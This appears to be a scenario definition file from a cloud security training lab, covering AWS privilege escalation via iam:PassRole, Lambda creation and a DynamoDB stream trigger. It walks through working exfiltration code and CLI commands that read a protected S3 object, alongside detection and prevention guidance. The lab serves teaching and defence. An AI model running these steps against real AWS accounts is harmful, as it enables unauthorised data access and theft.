@@ -1,0 +1,269 @@
+{
+  "displayName": "Lambda Function Creation + DynamoDB Event Source to Bucket",
+  "name": "lambda-002-iam-passrole+lambda-createfunction+createeventsourcemapping-dynamodb",
+  "description": "Pass scoped S3-access role to Lambda function, link to DynamoDB stream for passive execution without requiring InvokeFunction permission",
+  "costEstimate": "$0/mo",
+  "pathfindingCloudId": "lambda-002",
+  "interactiveDemo": false,
+  "supportsOnlineMode": false,
+  "category": "Privilege Escalation",
+  "subCategory": "new-passrole",
+  "pathType": "one-hop",
+  "target": "to-bucket",
+  "environments": [
+    "prod"
+  ],
+  "attackPath": {
+    "principals": [],
+    "summary": ""
+  },
+  "mitreAttack": {
+    "tactics": [
+      "TA0004 - Privilege Escalation",
+      "TA0009 - Collection"
+    ],
+    "techniques": [
+      "T1530 - Data from Cloud Storage Object",
+      "T1578 - Modify Cloud Compute Infrastructure"
+    ]
+  },
+  "terraform": {
+    "variableName": "enable_single_account_privesc_one_hop_to_bucket_lambda_002_iam_passrole_lambda_createfunction_createeventsourcemapping_dynamodb",
+    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-bucket/lambda-002-iam-passrole+lambda-createfunction+createeventsourcemapping-dynamodb"
+  },
+  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-bucket/lambda-002-iam-passrole+lambda-createfunction+createeventsourcemapping-dynamodb",
+  "schemaVersion": "4.7.1",
+  "permissions": {
+    "principals": [
+      {
+        "name": "pl-prod-lambda-002-to-bucket-starting-user",
+        "required": [
+          {
+            "permission": "iam:PassRole",
+            "resource": "arn:aws:iam::*:role/pl-prod-lambda-002-to-bucket-target-role",
+            "description": "pass the target role (which has S3 read access) to a Lambda function"
+          },
+          {
+            "permission": "lambda:CreateFunction",
+            "resource": "*",
+            "description": "create a Lambda function with the target role as its execution role"
+          },
+          {
+            "permission": "lambda:CreateEventSourceMapping",
+            "resource": "*",
+            "description": "link the Lambda function to a DynamoDB stream to trigger it passively"
+          }
+        ],
+        "helpful": [
+          {
+            "permission": "dynamodb:ListStreams",
+            "purpose": "discover available DynamoDB streams to target"
+          },
+          {
+            "permission": "dynamodb:DescribeStream",
+            "purpose": "get stream ARN and configuration details"
+          },
+          {
+            "permission": "dynamodb:DescribeTable",
+            "purpose": "get table details including stream ARN"
+          },
+          {
+            "permission": "lambda:ListFunctions",
+            "purpose": "verify Lambda function creation"
+          },
+          {
+            "permission": "lambda:GetFunction",
+            "purpose": "confirm function configuration and role"
+          },
+          {
+            "permission": "lambda:GetEventSourceMapping",
+            "purpose": "check event source mapping status and verify activation"
+          },
+          {
+            "permission": "iam:ListRoles",
+            "purpose": "discover roles available for PassRole"
+          },
+          {
+            "permission": "dynamodb:PutItem",
+            "purpose": "trigger Lambda execution by inserting a record into the trigger table"
+          },
+          {
+            "permission": "dynamodb:GetItem",
+            "purpose": "read the exfiltrated flag value from the exfil table after Lambda execution"
+          }
+        ]
+      }
+    ]
+  },
+  "readme": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-lambda-002-to-bucket-starting-user` IAM user to the `pl-prod-lambda-002-to-bucket-{account_id}-{suffix}` S3 bucket by creating a Lambda function with a scoped S3-access role, linking it to a DynamoDB stream as a passive trigger, and exfiltrating the bucket's flag through a DynamoDB exfil table \u2014 no `lambda:InvokeFunction` permission required.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-bucket-starting-user`\n- **Destination resource:** `arn:aws:s3:::pl-prod-lambda-002-to-bucket-{account_id}-{suffix}`",
+    "setup": {
+      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
+      "deployNonInteractive": "```bash\nplabs enable lambda-002-to-bucket\nplabs apply\n```",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-002-to-bucket` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-bucket-starting-user` | Starting principal with PassRole, CreateFunction, and CreateEventSourceMapping permissions |\n| `arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role` | Target role with `s3:GetObject` + `s3:ListBucket` on the flag bucket and `dynamodb:PutItem` on the exfil table |\n| `arn:aws:s3:::pl-prod-lambda-002-to-bucket-{account_id}-{suffix}` | Target S3 bucket containing `flag.txt` |\n| `arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-bucket-trigger-table` | DynamoDB table with streams enabled; stream is used as the Lambda event source |\n| `arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-bucket-exfil-table` | DynamoDB table where the Lambda writes the exfiltrated flag value |",
+      "demoAttack": {
+        "executing": "The script will:\n1. Retrieve the starting user credentials from Terraform outputs\n2. Verify identity as `pl-prod-lambda-002-to-bucket-starting-user`\n3. Confirm the starting user lacks direct S3 access to the flag bucket\n4. Write and package a malicious Lambda function that reads `flag.txt` from S3 and writes the content to the exfil DynamoDB table\n5. Create the Lambda function, passing the target role as its execution role\n6. Look up the trigger table's stream ARN and create an event source mapping\n7. Poll the event source mapping until its state reaches `Enabled`\n8. Insert a record into the trigger table to fire the Lambda via the stream\n9. Poll the exfil table until the Lambda has written the flag value\n10. Print the exfiltrated flag",
+        "resourcesCreated": "- Malicious Lambda function (`pl-lambda-002-to-bucket-escalation-fn`) with the target role attached as its execution role\n- Lambda event source mapping linking the function to the DynamoDB trigger table stream\n- Exfiltrated flag value written to `pl-prod-lambda-002-to-bucket-exfil-table` under key `{pk: \"exfil\"}`",
+        "nonInteractive": "```bash\nplabs demo --list\nplabs demo lambda-002-iam-passrole+lambda-createfunction+createeventsourcemapping-dynamodb\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-002-to-bucket` in the scenarios list\n3. Press `r` to run the demo script"
+      },
+      "cleanup": {
+        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup lambda-002-iam-passrole+lambda-createfunction+createeventsourcemapping-dynamodb\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-002-to-bucket` in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable lambda-002-to-bucket\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-002-to-bucket` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- IAM user has `iam:PassRole` permission scoped to a role with `s3:GetObject` and `s3:ListBucket` on a sensitive bucket, enabling data access via Lambda\n- IAM user has `lambda:CreateFunction` combined with `iam:PassRole` on an S3-access role \u2014 a recognized privilege escalation path to sensitive data\n- IAM user has `lambda:CreateEventSourceMapping` allowing passive trigger of attacker-controlled Lambda functions without `lambda:InvokeFunction`\n- Role `pl-prod-lambda-002-to-bucket-target-role` with S3 bucket read access is passable by a non-privileged user \u2014 data exfiltration path exists\n- DynamoDB table `pl-prod-lambda-002-to-bucket-trigger-table` has streams enabled and is accessible as a Lambda event source, expanding the attack surface",
+        "prevention": "- **Restrict PassRole permissions**: Use resource-based conditions to limit which roles can be passed to Lambda functions. Combine a `\"StringEquals\": {\"iam:PassedToService\": \"lambda.amazonaws.com\"}` condition with explicit role ARN restrictions so only intended functions can assume sensitive roles.\n- **Implement Service Control Policies (SCPs)**: At the organization level, deny `lambda:CreateFunction` when used together with `iam:PassRole` targeting roles that have read access to sensitive S3 buckets.\n- **Restrict CreateEventSourceMapping**: Limit which principals can create event source mappings, especially for DynamoDB streams. Audit regularly for new mappings created by low-privilege users.\n- **Enable Lambda function code signing**: Require code signing for Lambda deployments to prevent unauthorized code from being deployed with privileged roles.\n- **Apply S3 bucket policies with deny conditions**: Add explicit deny statements on the target bucket for `s3:GetObject` unless the request originates from trusted, known Lambda function ARNs or specific VPC endpoints.\n- **Use IAM Access Analyzer**: Regularly scan for privilege escalation and data-access paths involving PassRole combined with Lambda or other compute creation permissions. Access Analyzer external and unused access findings can surface these paths before they are exploited."
+      },
+      "cloudSiem": {
+        "cloudTrailEvents": "- `lambda:CreateFunction20150331` -- new Lambda function created; inspect `requestParameters.role` to identify the role being passed \u2014 a role with S3 access here is the primary signal for this attack path\n- `lambda:CreateEventSourceMapping` -- Lambda function linked to a DynamoDB stream trigger; suspicious when the function was recently created by a low-privilege user\n- `dynamodb:PutItem` -- record inserted into the trigger table; may indicate attacker-initiated Lambda execution via stream\n- `s3:GetObject` -- object retrieved from the target S3 bucket; high severity when the requesting principal is a Lambda execution role recently attached by a low-privilege user\n- `dynamodb:PutItem` -- second occurrence on the exfil table; flag content written by the Lambda execution role; correlate with the trigger table write and `lambda:CreateFunction20150331` events",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
+    },
+    "references": "- [Lambda Function Creation + DynamoDB Event Source to Admin](../to-admin/lambda-002-iam-passrole+lambda-createfunction+createeventsourcemapping-dynamodb/README.md) -- the to-admin variant of this same technique\n- [https://pathfinding.cloud/paths/lambda-002](https://pathfinding.cloud/paths/lambda-002) -- pathfinding.cloud path entry for lambda-002",
+    "solution": "# Solution: Lambda Function Creation + DynamoDB Event Source to Bucket\n\nThis scenario demonstrates a data-access privilege escalation where an attacker uses `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` to exfiltrate a protected S3 object \u2014 without ever holding `lambda:InvokeFunction` or direct S3 read access.\n\nThe technique works by creating a Lambda function with a target role that has `s3:GetObject` on the sensitive bucket, then wiring that function to a DynamoDB stream as a passive trigger. When any record is written to the DynamoDB trigger table, the Lambda fires automatically under the target role's permissions, reads the S3 object, and writes the contents to a second DynamoDB table the attacker can read. The data leaves the S3 bucket without any direct S3 API call originating from the starting principal's credentials.\n\nThis pattern appears in environments where developers have been granted broad compute-creation permissions for CI/CD purposes, or where \"least privilege\" is applied to direct data access but not to the ability to pass roles to serverless functions. The event-driven execution model adds an extra layer of indirection that some CSPM tools and CloudTrail-based alerts miss: the `s3:GetObject` call in CloudTrail is attributed to the Lambda execution role, not the starting user \u2014 making the connection between a low-privilege attacker and the data access harder to trace without correlating multiple events across services.\n\n## The Challenge\n\nYou start as `pl-prod-lambda-002-to-bucket-starting-user`, an IAM user with three carefully scoped permissions: `iam:PassRole` on the target role, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping`. You do not have `s3:GetObject` on the flag bucket, `lambda:InvokeFunction`, or any direct path to the data.\n\nYour goal is to retrieve `flag.txt` from the target S3 bucket: `pl-prod-lambda-002-to-bucket-{account_id}-{suffix}`.\n\nThe Terraform-created resources in play are:\n\n- `arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-bucket-starting-user` \u2014 your starting principal\n- `arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role` \u2014 the target role with S3 read access and DynamoDB write access\n- `arn:aws:s3:::pl-prod-lambda-002-to-bucket-{account_id}-{suffix}` \u2014 the target bucket containing `flag.txt`\n- `arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-bucket-trigger-table` \u2014 a DynamoDB table with streams enabled; your Lambda trigger\n- `arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-bucket-exfil-table` \u2014 the exfil DynamoDB table where the Lambda will write the flag\n\n## Reconnaissance\n\nStart by confirming your identity and verifying you lack direct S3 access:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-bucket-starting-user\n\naws s3 cp s3://pl-prod-lambda-002-to-bucket-{account_id}-{suffix}/flag.txt -\n# An error occurred (AccessDenied) -- as expected\n```\n\nCheck the target role to understand what permissions you'll be working with:\n\n```bash\naws iam get-role --role-name pl-prod-lambda-002-to-bucket-target-role \\\n  --query 'Role.Arn' --output text\n# arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role\n```\n\nDiscover the trigger table's stream ARN \u2014 this is what the Lambda event source mapping will connect to:\n\n```bash\naws dynamodb describe-table \\\n  --table-name pl-prod-lambda-002-to-bucket-trigger-table \\\n  --query 'Table.LatestStreamArn' \\\n  --output text\n# arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-bucket-trigger-table/stream/{timestamp}\n```\n\nThe table has streams enabled. Any write to this table will fan out to subscribed Lambda functions. That is your passive trigger.\n\n## Exploitation\n\n### Step 1: Write the exfiltration Lambda function\n\nWrite a Python handler that uses the target role's `s3:GetObject` permission to read `flag.txt` and the role's `dynamodb:PutItem` permission to write it to the exfil table. This code runs under the target role's identity \u2014 not yours:\n\n```bash\ncat > /tmp/lambda_function.py << 'EOF'\nimport boto3\nimport os\n\ndef lambda_handler(event, context):\n    s3 = boto3.client('s3')\n    ddb = boto3.client('dynamodb')\n    bucket = os.environ['TARGET_BUCKET']\n    exfil_table = os.environ['EXFIL_TABLE']\n    obj = s3.get_object(Bucket=bucket, Key='flag.txt')\n    flag = obj['Body'].read().decode('utf-8').strip()\n    ddb.put_item(\n        TableName=exfil_table,\n        Item={\n            'pk': {'S': 'exfil'},\n            'value': {'S': flag}\n        }\n    )\n    return {'statusCode': 200, 'body': 'Exfiltration complete'}\nEOF\n\ncd /tmp && zip lambda_payload.zip lambda_function.py\n```\n\n### Step 2: Create the Lambda function with the target role\n\nThis is the core of the attack. You use `iam:PassRole` to attach the target role as the Lambda's execution role and `lambda:CreateFunction` to deploy your payload. From the moment this function exists, it has the ability to read the flag \u2014 it just needs a trigger:\n\n```bash\naws lambda create-function \\\n  --function-name pl-lambda-002-to-bucket-escalation-fn \\\n  --runtime python3.12 \\\n  --role arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role \\\n  --handler lambda_function.lambda_handler \\\n  --zip-file fileb:///tmp/lambda_payload.zip \\\n  --timeout 30 \\\n  --environment \"Variables={TARGET_BUCKET=pl-prod-lambda-002-to-bucket-{account_id}-{suffix},EXFIL_TABLE=pl-prod-lambda-002-to-bucket-exfil-table}\"\n```\n\nThe Lambda function now exists with the target role's S3 read and DynamoDB write permissions \u2014 but it has not executed yet.\n\n### Step 3: Create the event source mapping\n\nConnect your Lambda function to the DynamoDB trigger table's stream. This is what replaces `lambda:InvokeFunction`: instead of calling the function directly, you wire it to a stream so it fires automatically on data changes:\n\n```bash\nSTREAM_ARN=$(aws dynamodb describe-table \\\n  --table-name pl-prod-lambda-002-to-bucket-trigger-table \\\n  --query 'Table.LatestStreamArn' --output text)\n\naws lambda create-event-source-mapping \\\n  --function-name pl-lambda-002-to-bucket-escalation-fn \\\n  --event-source-arn \"$STREAM_ARN\" \\\n  --starting-position LATEST\n```\n\nThe mapping starts in a `Creating` state. It typically takes 30-90 seconds to transition to `Enabled`. Poll until it's ready before triggering:\n\n```bash\nUUID=$(aws lambda list-event-source-mappings \\\n  --function-name pl-lambda-002-to-bucket-escalation-fn \\\n  --query 'EventSourceMappings[0].UUID' --output text)\n\n# Poll until state is Enabled\naws lambda get-event-source-mapping --uuid \"$UUID\" \\\n  --query 'State' --output text\n# Enabled\n```\n\n### Step 4: Trigger the Lambda by writing to the DynamoDB table\n\nInsert a record into the trigger table. This write propagates through the DynamoDB stream and invokes your Lambda function with the target role's execution context:\n\n```bash\naws dynamodb put-item \\\n  --table-name pl-prod-lambda-002-to-bucket-trigger-table \\\n  --item '{\"pk\": {\"S\": \"trigger-1\"}}'\n```\n\nThe Lambda executes asynchronously. Wait 10-15 seconds for the function to complete and for DynamoDB to reflect the write. If the exfil table is empty after 30 seconds, the event source mapping may need a few more seconds despite showing `Enabled` \u2014 insert another record and wait again.\n\n## Verification\n\nCheck the exfil DynamoDB table for the flag value written by the Lambda execution:\n\n```bash\naws dynamodb get-item \\\n  --table-name pl-prod-lambda-002-to-bucket-exfil-table \\\n  --key '{\"pk\": {\"S\": \"exfil\"}}' \\\n  --query 'Item.value.S' \\\n  --output text\n```\n\nIf this returns the flag value, the Lambda executed successfully under the target role and read the S3 object on your behalf.\n\n## Capture the Flag\n\nThe flag is `flag.txt` inside the target S3 bucket. The Lambda exfiltrated its contents to the exfil DynamoDB table \u2014 the `dynamodb:GetItem` call above is the retrieval step. The canonical CLI retrieval from the source bucket (using the target role's `s3:GetObject` permission, which the Lambda exercised) is:\n\n```bash\naws s3 cp s3://pl-prod-lambda-002-to-bucket-{account_id}-{suffix}/flag.txt -\n```\n\nNote that your starting user credentials do not have `s3:GetObject` on this bucket \u2014 only the Lambda execution role does. The flag value you captured from the exfil DynamoDB table is what the Lambda read from the bucket using the target role. This is the indirect exfiltration path: your credentials never touched S3 directly; the target role did it on your behalf, triggered by the stream event you manufactured.\n\n## What Happened\n\nYou exploited the combination of `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` to reach data you had no direct access to \u2014 without ever invoking a Lambda function directly or holding an S3 read permission on your own principal.\n\nThe attack chain works because AWS's permission model evaluates each API call in isolation: your `create-event-source-mapping` call is authorized by your IAM user policy, and the subsequent `s3:GetObject` call is authorized by the Lambda execution role's policy. There is no single API call that combines both permission checks, so a misconfigured IAM setup where direct access is restricted but PassRole is not creates a complete exfiltration path.\n\nIn real environments, this pattern is exploitable anywhere a developer account has broad Lambda or compute creation permissions and there are roles with narrower data-access grants. The event-driven trigger mechanism makes it harder to detect than a direct `s3:GetObject` or `lambda:InvokeFunction` call: the S3 access in CloudTrail is attributed to the Lambda execution role and appears alongside any other legitimate Lambda invocations accessing that bucket. Correlating it back to the attacker requires joining the `lambda:CreateFunction20150331` and `lambda:CreateEventSourceMapping` events \u2014 a step many alert rules miss.\n"
+  },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-principal",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-lambda-002-to-bucket-starting-user",
+        "access": {
+          "type": "assumed-breach-credentials"
+        },
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has iam:PassRole on the target role (which holds S3 read access to the flag bucket), lambda:CreateFunction, and lambda:CreateEventSourceMapping \u2014 enabling passive data exfiltration via a DynamoDB stream-triggered Lambda function without requiring lambda:InvokeFunction.\n"
+      },
+      {
+        "id": "lambda-function",
+        "label": "Malicious Lambda",
+        "type": "resource",
+        "subType": "lambda-function",
+        "arn": "arn:aws:lambda:{region}:{account_id}:function/pl-lambda-002-to-bucket-escalation-fn",
+        "description": "An attacker-created Lambda function with the target role attached as its execution role. The function contains code that reads flag.txt from the target S3 bucket and writes the contents to the exfil DynamoDB table. It is connected to the DynamoDB trigger table stream and executes automatically whenever a record is written to the trigger table \u2014 no direct invocation required.\n"
+      },
+      {
+        "id": "dynamodb-trigger",
+        "label": "DynamoDB Trigger",
+        "type": "resource",
+        "subType": "dynamodb-table",
+        "arn": "arn:aws:dynamodb:{region}:{account_id}:table/pl-prod-lambda-002-to-bucket-trigger-table",
+        "description": "A DynamoDB table with streams enabled. The attacker creates an event source mapping linking this table's stream to the malicious Lambda function. Any write to the table (attacker-inserted or from legitimate application activity) triggers the Lambda to execute with the target role's permissions.\n"
+      },
+      {
+        "id": "target-role",
+        "label": "Target Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role",
+        "description": "This IAM role has s3:GetObject and s3:ListBucket on the target S3 bucket, plus dynamodb:PutItem on the exfil table. It is passed to the malicious Lambda function as its execution role. When the Lambda executes, it runs under this role's permissions, reads flag.txt from the S3 bucket, and writes the content to the exfil DynamoDB table.\n"
+      },
+      {
+        "id": "target-bucket",
+        "label": "Flag Bucket",
+        "type": "resource",
+        "subType": "s3-bucket",
+        "isTarget": true,
+        "arn": "arn:aws:s3:::pl-prod-lambda-002-to-bucket-{account_id}-{suffix}",
+        "description": "The target S3 bucket containing flag.txt \u2014 the CTF flag for this scenario. The bucket is not directly accessible to the starting user. The Lambda execution role reads the flag object and writes the value to the exfil DynamoDB table, from which the attacker retrieves it. Retrieve the flag with: aws s3 cp s3://pl-prod-lambda-002-to-bucket-{account_id}-{suffix}/flag.txt -\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-principal",
+        "to": "lambda-function",
+        "label": "iam:PassRole + lambda:CreateFunction",
+        "description": "The starting user creates a new Lambda function, passing the target role as the function's execution role. The function code reads flag.txt from the target S3 bucket using the role's s3:GetObject permission and writes the content to the exfil DynamoDB table using the role's dynamodb:PutItem permission.\n",
+        "hints": [
+          "Create a Lambda function with the target role as its execution role (via iam:PassRole). The function code should use the role's s3:GetObject permission to read flag.txt from the target bucket, then write the value to the exfil DynamoDB table using dynamodb:PutItem.",
+          "Browse to https://pathfinding.cloud/paths/lambda-002 for technique details."
+        ],
+        "commands": [
+          {
+            "description": "Create malicious Lambda function code",
+            "command": "cat > /tmp/lambda_function.py << 'EOF'\nimport boto3\nimport os\n\ndef lambda_handler(event, context):\n    s3 = boto3.client('s3')\n    ddb = boto3.client('dynamodb')\n    bucket = os.environ['TARGET_BUCKET']\n    exfil_table = os.environ['EXFIL_TABLE']\n    obj = s3.get_object(Bucket=bucket, Key='flag.txt')\n    flag = obj['Body'].read().decode('utf-8').strip()\n    ddb.put_item(\n        TableName=exfil_table,\n        Item={\n            'pk': {'S': 'exfil'},\n            'value': {'S': flag}\n        }\n    )\n    return {'statusCode': 200, 'body': 'Exfiltration complete'}\nEOF\ncd /tmp && zip lambda_payload.zip lambda_function.py\n"
+          },
+          {
+            "description": "Create Lambda function with target role",
+            "command": "aws lambda create-function --function-name pl-lambda-002-to-bucket-escalation-fn --runtime python3.12 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-002-to-bucket-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_payload.zip --environment Variables={TARGET_BUCKET=pl-prod-lambda-002-to-bucket-{account_id}-{suffix},EXFIL_TABLE=pl-prod-lambda-002-to-bucket-exfil-table}"
+          }
+        ]
+      },
+      {
+        "from": "lambda-function",
+        "to": "dynamodb-trigger",
+        "label": "lambda:CreateEventSourceMapping",
+        "description": "The starting user creates an event source mapping connecting the Lambda function to the DynamoDB trigger table's stream. This causes the Lambda to execute automatically whenever records are written to the trigger table \u2014 no lambda:InvokeFunction permission needed.\n",
+        "hints": [
+          "Use lambda:CreateEventSourceMapping with the trigger table's LatestStreamArn and --starting-position LATEST to connect the function to the stream. Poll lambda:GetEventSourceMapping until the mapping state reaches 'Enabled' before inserting the trigger record \u2014 the mapping starts in 'Creating' and takes up to a minute to activate."
+        ],
+        "commands": [
+          {
+            "description": "Get the DynamoDB trigger table stream ARN",
+            "command": "aws dynamodb describe-table --table-name pl-prod-lambda-002-to-bucket-trigger-table --query 'Table.LatestStreamArn' --output text"
+          },
+          {
+            "description": "Create event source mapping to trigger Lambda from DynamoDB stream",
+            "command": "aws lambda create-event-source-mapping --function-name pl-lambda-002-to-bucket-escalation-fn --event-source-arn <stream-arn> --starting-position LATEST"
+          },
+          {
+            "description": "Poll until the event source mapping is Enabled",
+            "command": "aws lambda get-event-source-mapping --uuid <mapping-uuid> --query 'State' --output text"
+          }
+        ]
+      },
+      {
+        "from": "dynamodb-trigger",
+        "to": "target-role",
+        "label": "DynamoDB PutItem -> Lambda executes -> s3:GetObject + dynamodb:PutItem",
+        "description": "Writing a record to the DynamoDB trigger table fires the Lambda function via the stream. The Lambda executes with the target role's permissions, reads flag.txt from the S3 bucket, and writes the flag value to the exfil DynamoDB table. The attacker then reads the exfiltrated value from the exfil table.\n",
+        "hints": [
+          "Write a record to the trigger table with dynamodb:PutItem to fire the Lambda via the stream. Wait 10-15 seconds for execution, then read the exfiltrated flag from the exfil table using dynamodb:GetItem with key {pk: 'exfil', sk: 'flag'}. If the item is not present yet, the ESM may still be initializing \u2014 insert another record and wait again."
+        ],
+        "commands": [
+          {
+            "description": "Trigger Lambda execution by inserting a record into the trigger table",
+            "command": "aws dynamodb put-item --table-name pl-prod-lambda-002-to-bucket-trigger-table --item '{\"pk\": {\"S\": \"trigger-1\"}}'"
+          },
+          {
+            "description": "Read the exfiltrated flag from the exfil table",
+            "command": "aws dynamodb get-item --table-name pl-prod-lambda-002-to-bucket-exfil-table --key '{\"pk\": {\"S\": \"exfil\"}}' --query 'Item.value.S' --output text"
+          }
+        ]
+      },
+      {
+        "from": "target-role",
+        "to": "target-bucket",
+        "label": "Read CTF flag",
+        "description": "The target role's s3:GetObject permission on the flag bucket allows the Lambda execution to read flag.txt. The flag is exfiltrated via the exfil DynamoDB table and can be confirmed directly from S3 if the starting user gains direct S3 access. The canonical flag retrieval is via the exfil table (see previous edge) or by reading the object directly once access is confirmed.\n",
+        "hints": [],
+        "commands": [
+          {
+            "description": "Retrieve the CTF flag from the target S3 bucket (via exfil table read in previous step, or directly if bucket access is available)",
+            "command": "aws s3 cp s3://pl-prod-lambda-002-to-bucket-{account_id}-{suffix}/flag.txt -"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
+  "principalHopCount": 1,
+  "startAccessType": "assumed-breach-credentials",
+  "services": [
+    "iam",
+    "lambda"
+  ],
+  "slug": "lambda-002-to-bucket",
+  "hasDemoTranscript": true
+}
